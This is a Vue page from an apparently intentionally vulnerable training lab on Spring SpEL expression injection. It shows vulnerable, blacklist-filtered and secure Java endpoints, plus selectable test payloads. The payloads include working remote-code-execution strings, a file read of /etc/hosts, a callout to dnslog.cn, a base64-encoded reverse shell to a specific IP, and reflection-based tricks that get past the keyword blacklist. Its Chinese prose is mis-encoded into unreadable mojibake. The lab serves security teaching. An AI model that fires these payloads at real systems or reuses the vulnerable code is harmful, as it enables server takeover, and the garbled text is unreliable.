<template>
  <div class="root-div">
    <div class="vuln-info">
      <div class="header-div">SpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´</div>
      <div class="body-div">
        <el-tabs v-model="activeName" @tab-click="handleClick">
          <el-tab-pane label="æ¼æ´æè¿°" name="first">
            <div class="vuln-detail">
              SpELï¼ˆSpring Expression Languageï¼ŒSpringè¡¨è¾¾å¼è¯­è¨€ï¼‰æ˜¯Springæ¡†æ¶æä¾›çš„å¼ºå¤§è¡¨è¾¾å¼è¯­è¨€ï¼Œæ”¯æŒåœ¨è¿è¡Œæ—¶æŸ¥è¯¢å’Œæ“ä½œå¯¹è±¡å›¾ã€‚å½“åº”ç”¨ç¨‹åºå°†ç”¨æˆ·å¯æ§çš„è¾“å…¥ç›´æ¥æ‹¼æ¥åˆ°SpELè¡¨è¾¾å¼ä¸­å¹¶æ‰§è¡Œæ—¶ï¼Œæ”»å‡»è€…å¯ä»¥æ³¨å…¥æ¶æ„è¡¨è¾¾å¼ï¼Œå®ç°ä»»æ„ä»£ç æ‰§è¡Œã€‚
              <br /><br />
              <span style="color: red;">æ”»å‡»åŸç†ï¼š</span>
              <br />
              1. åº”ç”¨ç¨‹åºä½¿ç”¨SpelExpressionParserè§£æç”¨æˆ·è¾“å…¥
              <br />
              2. æ”»å‡»è€…è¾“å…¥åŒ…å«T()è¯­æ³•çš„æ¶æ„SpELè¡¨è¾¾å¼
              <br />
              3. è¡¨è¾¾å¼é€šè¿‡T()è¯­æ³•è®¿é—®Javaç±»
              <br />
              4. è°ƒç”¨Runtime.getRuntime().exec()æ‰§è¡Œç³»ç»Ÿå‘½ä»¤
              <br />
              5. æˆåŠŸå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰
            </div>
          </el-tab-pane>
          <el-tab-pane label="æ¼æ´å±å®³" name="second">
            <div class="vuln-detail">
              SpELè¡¨è¾¾å¼æ³¨å…¥æ˜¯ä¸€ä¸ªé«˜å±æ¼æ´ï¼Œå¯èƒ½é€ æˆä¸¥é‡çš„å®‰å…¨åæœï¼š
              <br /><br />
              <span style="color: red;">ä¸»è¦å±å®³ï¼š</span>
              <br />
              â€¢ è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰ï¼šæ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ï¼Œå®Œå…¨æ§åˆ¶æœåŠ¡å™¨
              <br />
              â€¢ æ–‡ä»¶æ“ä½œï¼šè¯»å–ã€åˆ›å»ºã€ä¿®æ”¹ã€åˆ é™¤æœåŠ¡å™¨æ–‡ä»¶
              <br />
              â€¢ ä¿¡æ¯æ³„éœ²ï¼šè·å–ç³»ç»Ÿå±æ€§ã€ç¯å¢ƒå˜é‡ã€æ•æ„Ÿé…ç½®
              <br />
              â€¢ åå¼¹Shellï¼šå»ºç«‹æŒä¹…åŒ–åé—¨
              <br />
              â€¢ å†…ç½‘æ¸—é€ï¼šä»¥æœåŠ¡å™¨ä¸ºè·³æ¿æ”»å‡»å†…ç½‘
              <br /><br />
              <span style="color: red;">çœŸå®æ¡ˆä¾‹ï¼š</span>
              <br />
              â€¢ CVE-2016-4977: Spring Security OAuth SpELæ³¨å…¥
              <br />
              â€¢ CVE-2018-1273: Spring Data Commons SpELæ³¨å…¥
              <br />
              â€¢ CVE-2022-22963: Spring Cloud Function SpELæ³¨å…¥
            </div>
          </el-tab-pane>
          <el-tab-pane label="å®‰å…¨ç¼–ç " name="third">
            <div class="vuln-detail">
              <span style="color: red;">ã€å¿…é¡»ã€‘é¿å…ç›´æ¥ä½¿ç”¨ç”¨æˆ·è¾“å…¥</span>
              <br />
              æ°¸è¿œä¸è¦å°†ç”¨æˆ·è¾“å…¥ç›´æ¥æ‹¼æ¥åˆ°SpELè¡¨è¾¾å¼ä¸­ã€‚å¦‚æœå¿…é¡»ä½¿ç”¨åŠ¨æ€è¡¨è¾¾å¼ï¼Œä½¿ç”¨ç™½åå•éªŒè¯ã€‚
              <br /><br />
              <span style="color: red;">ã€å¿…é¡»ã€‘ä½¿ç”¨SimpleEvaluationContext</span>
              <br />
              ä½¿ç”¨SimpleEvaluationContextä»£æ›¿StandardEvaluationContextï¼Œé™åˆ¶SpELçš„èƒ½åŠ›ã€‚
              <br /><br />
              <span style="color: red;">ã€å¿…é¡»ã€‘ä¸¥æ ¼çš„è¾“å…¥éªŒè¯</span>
              <br />
              ä½¿ç”¨ç™½åå•éªŒè¯ç”¨æˆ·è¾“å…¥ï¼Œåªå…è®¸å®‰å…¨çš„å­—ç¬¦ï¼ˆå¦‚ï¼šå­—æ¯ã€æ•°å­—ã€è¿ç®—ç¬¦ç­‰ï¼‰ã€‚
              <br /><br />
              <span style="color: red;">ã€å»ºè®®ã€‘ä½¿ç”¨é¢„å®šä¹‰è¡¨è¾¾å¼</span>
              <br />
              è®¾è®¡ç™½åå•æœºåˆ¶ï¼Œåªå…è®¸æ‰§è¡Œé¢„å®šä¹‰çš„å®‰å…¨è¡¨è¾¾å¼ï¼Œé¿å…åŠ¨æ€æ‹¼æ¥ç”¨æˆ·è¾“å…¥ã€‚
            </div>
          </el-tab-pane>
          <el-tab-pane label="å‚è€ƒæ–‡ç« " name="fourth">
            <div class="vuln-detail">
              <a href="https://docs.spring.io/spring-framework/docs/current/reference/html/core.html#expressions" target="_blank" style="text-decoration: underline;">ã€ŠSpringå®˜æ–¹æ–‡æ¡£ - SpELã€‹</a>ï¼šSpringè¡¨è¾¾å¼è¯­è¨€çš„å®˜æ–¹æ–‡æ¡£ã€‚<br />
              <a href="https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/" target="_blank" style="text-decoration: underline;">ã€ŠSpELæ³¨å…¥æ”»å‡»è¯¦è§£ã€‹</a>ï¼šæ·±å…¥äº†è§£SpELæ³¨å…¥åŸç†å’Œåˆ©ç”¨æŠ€å·§ã€‚<br />
            </div>
          </el-tab-pane>
        </el-tabs>
      </div>
    </div>
    <div class="code-demo">
      <el-row :gutter="20" class="grid-flex">
        <el-col :span="12">
          <div class="grid-content bg-purple">
            <el-row type="flex" justify="space-between" align="middle">
              æ¼æ´ä»£ç  - StandardEvaluationContext
              <el-button type="danger" round size="mini" @click="showVulnDialog">å»æµ‹è¯•</el-button>
            </el-row>
            <pre v-highlightjs><code class="java">
/**
 * SpELè¡¨è¾¾å¼æ³¨å…¥ - æ¼æ´ä»£ç 
 * ä½¿ç”¨StandardEvaluationContextï¼Œå…è®¸æ‰§è¡Œä»»æ„ä»£ç 
 */
@PostMapping("/vuln")
public Result spelVulnerable(@RequestBody Map&lt;String, String&gt; request) {
    String expression = request.get("expression");
    
    if (expression == null || expression.trim().isEmpty()) {
        return Result.error("è¡¨è¾¾å¼ä¸èƒ½ä¸ºç©º");
    }
    
    try {
        // å±é™©ï¼šä½¿ç”¨StandardEvaluationContext
        ExpressionParser parser = new SpelExpressionParser();
        StandardEvaluationContext context = new StandardEvaluationContext();
        
        Expression exp = parser.parseExpression(expression);
        Object result = exp.getValue(context);
        
        String resultStr = result != null ? result.toString() : "null";
        return Result.success(resultStr);
    } catch (Exception e) {
        return Result.error("è¡¨è¾¾å¼æ‰§è¡Œå¤±è´¥: " + e.getMessage());
    }
}</code></pre>
          </div>
        </el-col>
        <el-col :span="12">
          <div class="grid-content bg-purple">
            <el-row type="flex" justify="space-between" align="middle">
              å®‰å…¨ä»£ç  - SimpleEvaluationContext
              <el-button type="success" round size="mini" @click="showSecDialog">å»æµ‹è¯•</el-button>
            </el-row>
            <pre v-highlightjs><code class="java">
/**
 * SpELè¡¨è¾¾å¼æ³¨å…¥ - å®‰å…¨ä»£ç 
 * ä½¿ç”¨SimpleEvaluationContextï¼Œé™åˆ¶SpELèƒ½åŠ›
 */
@PostMapping("/sec")
public Result spelSecure(@RequestBody Map&lt;String, String&gt; request) {
    String expression = request.get("expression");
    
    if (expression == null || expression.trim().isEmpty()) {
        return Result.error("è¡¨è¾¾å¼ä¸èƒ½ä¸ºç©º");
    }
    
    try {
        // å®‰å…¨ï¼šä½¿ç”¨SimpleEvaluationContextï¼Œé™åˆ¶SpELèƒ½åŠ›
        // ä¸å…è®¸è®¿é—®ç±»å‹å¼•ç”¨ï¼ˆT()ï¼‰ã€æ„é€ å‡½æ•°ã€åå°„ç­‰å±é™©åŠŸèƒ½
        ExpressionParser parser = new SpelExpressionParser();
        SimpleEvaluationContext context = 
            SimpleEvaluationContext.forReadOnlyDataBinding().build();
        
        Expression exp = parser.parseExpression(expression);
        Object result = exp.getValue(context);
        
        String resultStr = result != null ? result.toString() : "null";
        return Result.success(resultStr);
    } catch (Exception e) {
        return Result.error("è¡¨è¾¾å¼æ‰§è¡Œå¤±è´¥: " + e.getMessage());
    }
}</code></pre>
          </div>
        </el-col>
      </el-row>
      <el-row :gutter="20" class="grid-flex">
        <el-col :span="12">
          <div class="grid-content bg-purple">
            <el-row type="flex" justify="space-between" align="middle">
              æ¼æ´ä»£ç  - é»‘åå•è¿‡æ»¤ï¼ˆå¯ç»•è¿‡ï¼‰
              <el-button type="danger" round size="mini" @click="showFilterDialog">å»æµ‹è¯•</el-button>
            </el-row>
            <pre v-highlightjs><code class="java">
/**
 * SpELè¡¨è¾¾å¼æ³¨å…¥ - é»‘åå•è¿‡æ»¤ï¼ˆå¯è¢«ç»•è¿‡ï¼‰
 * å°è¯•é€šè¿‡é»‘åå•è¿‡æ»¤å±é™©å­—ç¬¦ï¼Œä½†è¿‡æ»¤ä¸å®Œå–„
 */
@PostMapping("/filter")
public Result spelBlacklistFilter(@RequestBody Map&lt;String, String&gt; request) {
    String expression = request.get("expression");
    
    if (expression == null || expression.trim().isEmpty()) {
        return Result.error("è¡¨è¾¾å¼ä¸èƒ½ä¸ºç©º");
    }
    
    // ä¸å®Œå–„çš„é»‘åå•è¿‡æ»¤ï¼šåªè¿‡æ»¤äº†éƒ¨åˆ†å±é™©å…³é”®å­—
    String[] blacklist = {"Runtime", "exec"};
    for (String keyword : blacklist) {
        if (expression.contains(keyword)) {
            return Result.error("è¡¨è¾¾å¼åŒ…å«å±é™©å…³é”®å­—: " + keyword);
        }
    }
    
    try {
        // å±é™©ï¼šå³ä½¿æœ‰é»‘åå•è¿‡æ»¤ï¼Œä¾ç„¶ä½¿ç”¨StandardEvaluationContext
        ExpressionParser parser = new SpelExpressionParser();
        StandardEvaluationContext context = new StandardEvaluationContext();
        
        Expression exp = parser.parseExpression(expression);
        Object result = exp.getValue(context);
        
        String resultStr = result != null ? result.toString() : "null";
        return Result.success(resultStr);
    } catch (Exception e) {
        return Result.error("è¡¨è¾¾å¼æ‰§è¡Œå¤±è´¥: " + e.getMessage());
    }
}</code></pre>
          </div>
        </el-col>
        <el-col :span="12">

        </el-col>
      </el-row>
    </div>

    <!-- æ¼æ´æµ‹è¯•å¯¹è¯æ¡† -->
    <el-dialog title="SpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´æµ‹è¯•" :visible.sync="vulnDialogVisible" class="center-dialog">
      <div style="text-align: left; color: red; font-style: italic;">
        æ³¨æ„ï¼Œä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„SpELæ³¨å…¥æµ‹è¯•payloadï¼š<br>
        1. 7*7 - ç®€å•è®¡ç®—æµ‹è¯•<br>
        2. T(java.lang.System).getProperty('user.dir') - è·å–ç³»ç»Ÿå±æ€§<br>
        3. T(java.lang.Runtime).getRuntime().exec('curl dnslog.cn') - DNSLogæŸ¥è¯¢ï¼ˆå±é™©ï¼‰<br>
        4. T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get('/etc/hosts')) - è¯»å–æ–‡ä»¶ï¼ˆå±é™©ï¼‰<br>
        5. new java.io.File('/tmp/test.txt').createNewFile() - åˆ›å»ºæ–‡ä»¶ï¼ˆå±é™©ï¼‰<br>
        6. T(java.lang.Runtime).getRuntime().exec('bash -c {echo,...}|{base64,-d}|{bash,-i}') - åå¼¹shellï¼ˆæåº¦å±é™©ï¼‰
      </div>
      <br />
      <el-form class="demo-form-inline">
        <el-form-item label="é€‰æ‹©Payload">
          <el-select v-model="vulnForm.selectedPayload" placeholder="è¯·é€‰æ‹©æµ‹è¯•Payload" @change="updateVulnExpression">
            <el-option label="ç®€å•è®¡ç®— - 7*7" value="calc"></el-option>
            <el-option label="å­—ç¬¦ä¸²æ‹¼æ¥ - 'Hello ' + 'World'" value="string"></el-option>
            <el-option label="è·å–ç³»ç»Ÿå±æ€§ - user.dir" value="userdir"></el-option>
            <el-option label="è·å–ç³»ç»Ÿå±æ€§ - os.name" value="osname"></el-option>
            <el-option label="è·å–Javaç‰ˆæœ¬" value="javaversion"></el-option>
            <el-option label="ã€å±é™©ã€‘DNSLogæŸ¥è¯¢" value="dnslog"></el-option>
            <el-option label="ã€å±é™©ã€‘è¯»å–æ–‡ä»¶" value="readfile"></el-option>
            <el-option label="ã€æåº¦å±é™©ã€‘åå¼¹Shell" value="reverseshell"></el-option>
          </el-select>
        </el-form-item>
        <el-form-item label="SpELè¡¨è¾¾å¼">
          <el-input v-model="vulnForm.expression" type="textarea" :rows="3" placeholder="è¯·è¾“å…¥SpELè¡¨è¾¾å¼"></el-input>
        </el-form-item>
        <el-form-item>
          <el-button type="primary" @click="testVulnerable">æ‰§è¡Œè¡¨è¾¾å¼</el-button>
        </el-form-item>
      </el-form>
      <div v-if="vulnForm.result" class="result-display">
        <h4>æ‰§è¡Œç»“æœï¼š</h4>
        <div :class="['result-box', 'result-' + vulnForm.resultType]">
          {{ vulnForm.result }}
        </div>
      </div>
    </el-dialog>

    <!-- é»‘åå•è¿‡æ»¤æµ‹è¯•å¯¹è¯æ¡† -->
    <el-dialog title="SpELè¡¨è¾¾å¼æ³¨å…¥é»‘åå•è¿‡æ»¤æµ‹è¯•ï¼ˆå¯ç»•è¿‡ï¼‰" :visible.sync="filterDialogVisible" class="center-dialog">
      <div style="text-align: left; color: red; font-style: italic;">
        æ³¨æ„ï¼Œé»‘åå•åªè¿‡æ»¤äº†ä»¥ä¸‹å…³é”®å­—ï¼š<strong>Runtimeã€exec</strong><br>è¿™æ˜¯ä¸€ä¸ªéå¸¸ä¸å®Œå–„çš„é»‘åå•ï¼Œå¯ä»¥é€šè¿‡å¤šç§æ–¹å¼ç»•è¿‡ï¼š<br><br>
        <strong>ç»•è¿‡æ–¹å¼1-3ï¼šä½¿ç”¨æœªè¢«è¿‡æ»¤çš„å±é™©ç±»</strong><br>
        - ProcessBuilderï¼šåŠŸèƒ½ä¸Runtime.exec()ç±»ä¼¼ï¼Œä½†æœªè¢«è¿‡æ»¤<br>
        - Systemï¼šå¯è·å–æ•æ„Ÿç³»ç»Ÿä¿¡æ¯<br>
        - Fileï¼šå¯è¿›è¡Œæ–‡ä»¶ç³»ç»Ÿæ“ä½œ<br><br>
        <strong>ç»•è¿‡æ–¹å¼4ï¼šT()è¯­æ³• + åå°„ + å­—ç¬¦ä¸²æ‹¼æ¥</strong><br>
        - ä½¿ç”¨ T(String).getClass() è·å–Classç±»<br>
        - ä½¿ç”¨ forName('java.la'+'ng.Run'+'time') æ‹†åˆ†ç±»åå¹¶åŠ¨æ€åŠ è½½<br>
        - ä½¿ç”¨ getMethod('getRun'+'time') æ‹†åˆ†æ–¹æ³•åå¹¶åŠ¨æ€è·å–<br>
        - ä½¿ç”¨ getMethod('ex'+'ec') æ‹†åˆ†æ–¹æ³•åé¿å¼€å…³é”®å­—æ£€æµ‹<br><br>
        <strong>ç»•è¿‡æ–¹å¼5ï¼šå®Œå…¨åå°„é“¾ + å­—ç¬¦ä¸²æ‹¼æ¥</strong><br>
        - ä»å­—ç¬¦ä¸²å¯¹è±¡ ''.getClass() å¼€å§‹ï¼Œå®Œå…¨é¿å¼€T()è¯­æ³•<br>
        - åŒæ ·ä½¿ç”¨å­—ç¬¦ä¸²æ‹¼æ¥æ‹†åˆ†æ‰€æœ‰å…³é”®å­—<br>
        - çº¯ç²¹é€šè¿‡åå°„APIå®Œæˆæ”»å‡»ï¼Œæ›´åŠ éšè”½
      </div>
      <br />
      <el-form class="demo-form-inline">
        <el-form-item label="é€‰æ‹©ç»•è¿‡æ–¹å¼">
          <el-select v-model="filterForm.selectedBypass" placeholder="è¯·é€‰æ‹©ç»•è¿‡æ–¹å¼" @change="updateFilterExpression">
            <el-option label="ã€è¢«æ‹¦æˆªã€‘ç›´æ¥ä½¿ç”¨ Runtime.exec() - æµ‹è¯•é»‘åå•" value="blocked"></el-option>
            <el-option label="ã€ç»•è¿‡1ã€‘ä½¿ç”¨ ProcessBuilder ç±» - æœªè¢«è¿‡æ»¤" value="bypass1"></el-option>
            <el-option label="ã€ç»•è¿‡2ã€‘ä½¿ç”¨ System ç±» - è·å–ç³»ç»Ÿä¿¡æ¯" value="bypass2"></el-option>
            <el-option label="ã€ç»•è¿‡3ã€‘åˆ›å»ºæ–‡ä»¶ - new File().createNewFile()" value="bypass3"></el-option>
            <el-option label="ã€ç»•è¿‡4ã€‘T()è¯­æ³•+åå°„ - ä½¿ç”¨T(String)è·å–Class" value="bypass4"></el-option>
            <el-option label="ã€ç»•è¿‡5ã€‘å®Œå…¨åå°„ - ä»å­—ç¬¦ä¸²å¯¹è±¡å¼€å§‹åå°„" value="bypass5"></el-option>
          </el-select>
        </el-form-item>
        <el-form-item label="SpELè¡¨è¾¾å¼">
          <el-input v-model="filterForm.expression" type="textarea" :rows="4" placeholder="è¯·è¾“å…¥SpELè¡¨è¾¾å¼"></el-input>
        </el-form-item>
        <el-form-item>
          <el-button type="primary" @click="testFilter">æ‰§è¡Œè¡¨è¾¾å¼</el-button>
        </el-form-item>
      </el-form>
      <div v-if="filterForm.result" class="result-display">
        <h4>æ‰§è¡Œç»“æœï¼š</h4>
        <div :class="['result-box', 'result-' + filterForm.resultType]">
          {{ filterForm.result }}
        </div>
      </div>
    </el-dialog>

    <!-- å®‰å…¨ä»£ç æµ‹è¯•å¯¹è¯æ¡† -->
    <el-dialog title="SpELè¡¨è¾¾å¼æ³¨å…¥å®‰å…¨é˜²æŠ¤æµ‹è¯•" :visible.sync="secDialogVisible" class="center-dialog">
      <div style="text-align: left; color: red; font-style: italic;">
        æ³¨æ„ï¼Œä»¥ä¸‹æ˜¯ä¸€äº›ä¼šè¢«å®‰å…¨é˜²æŠ¤æ‹¦æˆªçš„payloadï¼š<br>
        1. T(java.lang.System).getProperty('user.dir') - è®¿é—®Javaç±»ï¼ˆè¢«æ‹¦æˆªï¼‰<br>
        2. T(java.lang.Runtime).getRuntime().exec('curl dnslog.cn') - DNSLogæŸ¥è¯¢ï¼ˆè¢«æ‹¦æˆªï¼‰<br>
        3. new java.io.File('/tmp/test.txt') - åˆ›å»ºå¯¹è±¡ï¼ˆè¢«æ‹¦æˆªï¼‰<br>
        <br>
        ä»¥ä¸‹æ˜¯å…è®¸çš„å®‰å…¨è¡¨è¾¾å¼ï¼š<br>
        1. 10 + 20 * 3 - æ•°å­¦è¿ç®—ï¼ˆå…è®¸ï¼‰<br>
        2. 100 - 50 - å‡æ³•è¿ç®—ï¼ˆå…è®¸ï¼‰<br>
        3. 3.14 * 2 - å°æ•°è¿ç®—ï¼ˆå…è®¸ï¼‰
      </div>
      <el-form class="demo-form-inline">
        <el-form-item label="æµ‹è¯•åœºæ™¯">
          <el-radio-group v-model="secForm.testType" @change="handleTestTypeChange">
            <el-radio label="safe">å®‰å…¨è¡¨è¾¾å¼</el-radio>
            <el-radio label="malicious">æ¶æ„è¡¨è¾¾å¼</el-radio>
          </el-radio-group>
        </el-form-item>
        <el-form-item label="é€‰æ‹©è¡¨è¾¾å¼">
          <el-select v-model="secForm.selectedExpression" placeholder="è¯·é€‰æ‹©è¡¨è¾¾å¼" @change="updateSecExpression">
            <template v-if="secForm.testType === 'safe'">
              <el-option label="æ•°å­¦è¿ç®—: 10 + 20 * 3" value="math1"></el-option>
              <el-option label="å‡æ³•è¿ç®—: 100 - 50" value="math2"></el-option>
              <el-option label="å°æ•°è¿ç®—: 3.14 * 2" value="math3"></el-option>
            </template>
            <template v-else>
              <el-option label="è®¿é—®Javaç±»" value="malicious1"></el-option>
              <el-option label="DNSLogæŸ¥è¯¢" value="malicious2"></el-option>
              <el-option label="åˆ›å»ºå¯¹è±¡" value="malicious3"></el-option>
            </template>
          </el-select>
        </el-form-item>
        <el-form-item label="SpELè¡¨è¾¾å¼">
          <el-input v-model="secForm.expression" type="textarea" :rows="3" readonly></el-input>
        </el-form-item>
        <el-form-item>
          <el-button type="primary" @click="testSecure">æµ‹è¯•è¡¨è¾¾å¼</el-button>
        </el-form-item>
      </el-form>
      <div v-if="secForm.result" class="result-display">
        <h4>æ‰§è¡Œç»“æœï¼š</h4>
        <div :class="['result-box', 'result-' + secForm.resultType]">
          {{ secForm.result }}
        </div>
      </div>
    </el-dialog>
  </div>
</template>

<script>
import { spelVulnerable, spelFilter, spelSecure } from '@/api/spel';

export default {
  data() {
    return {
      activeName: 'first',
      vulnDialogVisible: false,
      filterDialogVisible: false,
      secDialogVisible: false,
      vulnForm: {
        selectedPayload: '',
        expression: '',
        result: '',
        resultType: 'success'
      },
      filterForm: {
        selectedBypass: '',
        expression: '',
        result: '',
        resultType: 'success'
      },
      secForm: {
        testType: 'safe',
        selectedExpression: '',
        expression: '',
        result: '',
        resultType: 'success'
      }
    };
  },
  methods: {
    handleClick(tab, event) {
      // console.log(tab, event);
    },
    showVulnDialog() {
      this.vulnDialogVisible = true;
      this.vulnForm.selectedPayload = '';
      this.vulnForm.expression = '';
      this.vulnForm.result = '';
    },
    showFilterDialog() {
      this.filterDialogVisible = true;
      this.filterForm.selectedBypass = '';
      this.filterForm.expression = '';
      this.filterForm.result = '';
    },
    showSecDialog() {
      this.secDialogVisible = true;
      this.secForm.testType = 'safe';
      this.secForm.selectedExpression = '';
      this.secForm.expression = '';
      this.secForm.result = '';
    },
    updateVulnExpression() {
      const payloads = {
        'calc': '7*7',
        'string': "'Hello ' + 'World'",
        'userdir': "T(java.lang.System).getProperty('user.dir')",
        'osname': "T(java.lang.System).getProperty('os.name')",
        'javaversion': "T(java.lang.System).getProperty('java.version')",
        'dnslog': "T(java.lang.Runtime).getRuntime().exec('curl dnslog.cn')",
        'readfile': "T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get('/etc/hosts'))",
        'reverseshell': "T(java.lang.Runtime).getRuntime().exec('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80NS42Mi4xMTYuMTY5LzEyMzQgMD4mMQo=}|{base64,-d}|{bash,-i}')"
      };
      this.vulnForm.expression = payloads[this.vulnForm.selectedPayload] || '';
    },
    updateFilterExpression() {
      const bypassPayloads = {
        'blocked': "T(java.lang.Runtime).getRuntime().exec('whoami')",
        'bypass1': "new java.lang.ProcessBuilder(new java.lang.String[]{'whoami'}).start()",
        'bypass2': "T(java.lang.System).getProperty('user.name')",
        'bypass3': "new java.io.File('/tmp/spel_test.txt').createNewFile()",
        'bypass4': "T(String).getClass().forName('java.la'+'ng.Run'+'time').getMethod('getRun'+'time').invoke(null).getClass().getMethod('ex'+'ec',T(String)).invoke(T(String).getClass().forName('java.la'+'ng.Run'+'time').getMethod('getRun'+'time').invoke(null),'whoami')",
        'bypass5': "''.getClass().forName('java.la'+'ng.Run'+'time').getMethod('getRun'+'time').invoke(null).getClass().getMethod('ex'+'ec',T(String)).invoke(''.getClass().forName('java.la'+'ng.Run'+'time').getMethod('getRun'+'time').invoke(null),'whoami')"
      };
      this.filterForm.expression = bypassPayloads[this.filterForm.selectedBypass] || '';
    },
    handleTestTypeChange() {
      // åˆ‡æ¢æµ‹è¯•åœºæ™¯æ—¶ï¼Œæ¸…ç©ºé€‰æ‹©çš„è¡¨è¾¾å¼å’Œè¡¨è¾¾å¼å†…å®¹
      this.secForm.selectedExpression = '';
      this.secForm.expression = '';
      this.secForm.result = '';
    },
    updateSecExpression() {
      const expressions = {
        'math1': '10 + 20 * 3',
        'math2': '100 - 50',
        'math3': '3.14 * 2',
        'malicious1': "T(java.lang.System).getProperty('user.dir')",
        'malicious2': "T(java.lang.Runtime).getRuntime().exec('curl dnslog.cn')",
        'malicious3': "new java.io.File('/tmp/test.txt')"
      };
      this.secForm.expression = expressions[this.secForm.selectedExpression] || '';
    },
    testVulnerable() {
      if (!this.vulnForm.expression) {
        this.$message.warning('è¯·è¾“å…¥SpELè¡¨è¾¾å¼');
        return;
      }
      
      spelVulnerable({ expression: this.vulnForm.expression })
        .then(response => {
          this.vulnForm.result = 'âœ… è¡¨è¾¾å¼æ‰§è¡ŒæˆåŠŸï¼Œç»“æœ: ' + response.data;
          this.vulnForm.resultType = 'warning';
        })
        .catch(error => {
          this.vulnForm.result = 'âŒ è¡¨è¾¾å¼æ‰§è¡Œå¤±è´¥: ' + (error.msg || error.message || 'æœªçŸ¥é”™è¯¯');
          this.vulnForm.resultType = 'error';
        });
    },
    testFilter() {
      if (!this.filterForm.expression) {
        this.$message.warning('è¯·è¾“å…¥SpELè¡¨è¾¾å¼');
        return;
      }
      
      spelFilter({ expression: this.filterForm.expression })
        .then(response => {
          this.filterForm.result = 'âœ… ç»•è¿‡æˆåŠŸï¼è¡¨è¾¾å¼æ‰§è¡Œç»“æœ: ' + response.data;
          this.filterForm.resultType = 'warning';
        })
        .catch(error => {
          // è¢«é»‘åå•æ‹¦æˆª
          if (error.msg && error.msg.includes('å±é™©å…³é”®å­—')) {
            this.filterForm.result = 'ğŸ›¡ï¸ è¢«é»‘åå•æ‹¦æˆª: ' + error.msg;
            this.filterForm.resultType = 'error';
          } else {
            this.filterForm.result = 'âŒ è¡¨è¾¾å¼æ‰§è¡Œå¤±è´¥: ' + (error.msg || error.message || 'æœªçŸ¥é”™è¯¯');
            this.filterForm.resultType = 'error';
          }
        });
    },
    testSecure() {
      if (!this.secForm.expression) {
        this.$message.warning('è¯·é€‰æ‹©è¡¨è¾¾å¼');
        return;
      }
      
      spelSecure({ expression: this.secForm.expression })
        .then(response => {
          this.secForm.result = 'âœ… è¡¨è¾¾å¼æ‰§è¡ŒæˆåŠŸï¼Œç»“æœ: ' + response.data;
          this.secForm.resultType = 'success';
        })
        .catch(error => {
          this.secForm.result = 'âŒ å®‰å…¨æœºåˆ¶ç”Ÿæ•ˆï¼Œ' + (error.msg || 'è¡¨è¾¾å¼è¢«æ‹¦æˆª');
          this.secForm.resultType = 'success';
        });
    }
  }
};
</script>

<style scoped>
.root-div {
  height: 100%;
}

.vuln-info {
  border-radius: 10px;
  margin-left: 20px;
  margin-right: 20px;
  margin-bottom: 20px;
  margin-top: 10px;
}

.header-div {
  font-size: 24px;
  color: #409EFF;
  font-weight: bold;
  padding: 10px;
  justify-content: center;
  align-items: center;
  border-bottom: 1px solid #ccc;
}

.body-div {
  padding: 10px;
  justify-content: center;
  align-items: center;
  font-family: Arial, sans-serif;
  font-size: 14px;
}

.vuln-detail {
  background-color: #dce9f8;
  padding: 10px;
}

.code-demo {
  margin: 20px;
  border-top: 1px solid #ccc;
  padding-top: 20px;
}

pre code {
  font-size: 12px;
}

.el-row {
  margin-bottom: 20px;
}

.el-row:last-child {
  margin-bottom: 0;
}

.el-col {
  border-radius: 4px;
}

.bg-purple {
  background: #d3dce6;
}

.grid-content {
  border-radius: 4px;
  height: 100%;
  padding: 10px;
}

.grid-flex {
  display: flex;
  align-items: stretch;
}

.center-dialog {
  text-align: center;
  margin: 0 auto;
}

.demo-form-inline {
  text-align: left;
}

.result-display {
  margin-top: 20px;
  text-align: left;
}

.result-display h4 {
  margin-top: 0;
  margin-bottom: 10px;
  color: #303133;
  font-size: 16px;
  font-weight: bold;
}

.result-box {
  padding: 12px 16px;
  border-radius: 4px;
  line-height: 1.5;
  font-size: 14px;
}

.result-warning {
  background-color: #fdf6ec;
  color: #e6a23c;
  border: 1px solid #f5dab1;
}

.result-success {
  background-color: #f0f9ff;
  color: #67c23a;
  border: 1px solid #c6e2ff;
}

.result-error {
  background-color: #fef0f0;
  color: #f56c6c;
  border: 1px solid #fbc4c4;
}
</style>
